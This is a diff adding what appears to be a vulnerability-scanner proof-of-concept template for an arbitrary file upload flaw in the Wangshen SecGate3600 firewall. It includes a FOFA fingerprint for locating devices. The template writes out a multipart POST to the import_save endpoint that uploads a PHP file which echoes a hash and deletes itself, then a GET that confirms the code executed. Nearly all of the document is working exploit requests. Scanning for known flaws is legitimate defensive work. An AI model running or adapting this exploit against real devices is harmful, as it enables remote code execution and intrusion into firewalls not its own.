@@ -1,0 +1,45 @@
+id: poc-yaml-wangshen-secgate3600-import-save-arbitrary-file-upload
+info:
+  name: 网神SecGate3600防火墙 import_save 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 网神SecGate3600
+  fofa: fid="1Lh1LHi6yfkhiO83I59AYg=="
+variables:
+  boundary: random_str(10)
+  fname: md5(boundary)
+  v_random_str: random_str(5)
+  v_verify_code: md5(v_random_str)
+requests:
+- method: POST
+  path: /?g=app_av_import_save
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.boundary}}
+  data: '------WebKitFormBoundary{{.boundary}}
+
+    Content-Disposition: form-data; name="upfile"; filename="{{.fname}}.php"
+
+    Content-Type: text/plain
+
+
+    <?php echo md5("{{.v_random_str}}");unlink(__FILE__);?>
+
+
+    ------WebKitFormBoundary{{.boundary}}
+
+    Content-Disposition: form-data; name="submit_post"
+
+
+    obj_app_upfile
+
+    ------WebKitFormBoundary{{.boundary}}--
+
+    '
+  expression: status_code == 302 && contains(body, "File is valid, and was successfully
+    uploaded.")
+- method: GET
+  path: /attachements/{{.fname}}.php
+  expression: status_code == 200 && contains(body, v_verify_code) && !contains(body,
+    "<")
+transport: http
